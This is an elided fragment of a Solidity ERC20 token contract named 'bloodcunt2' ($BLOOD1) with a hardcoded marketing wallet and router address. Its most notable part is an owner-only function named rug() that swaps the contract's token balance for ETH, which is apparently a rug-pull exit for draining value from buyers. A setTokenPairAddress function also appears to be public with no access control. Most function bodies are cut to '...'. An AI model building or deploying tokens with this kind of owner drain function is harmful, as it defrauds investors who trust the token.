...
///////////////////////////////////////
contract BLOOD2 is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(0x6d050A42084257c4E59009A8877B0Ac2f6e9927e);
    ...
    string private _name = "bloodcunt2";
    string private _symbol = "$BLOOD1";
    ...
    uint256 private numTokensSellToLiquify = 1 * 10**6 * 10**9;
    ...
    constructor() {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            ...
            0xE4A575550C2b460d2307b82dCd7aFe84AD1484dd //avaxt
        );
    ...
    function setTokenPairAddress(address _pairAddress) public {
    ...
    function rug() external onlyOwner {
        ...
        swapTokensForEth(contractTokenBalances);
    }
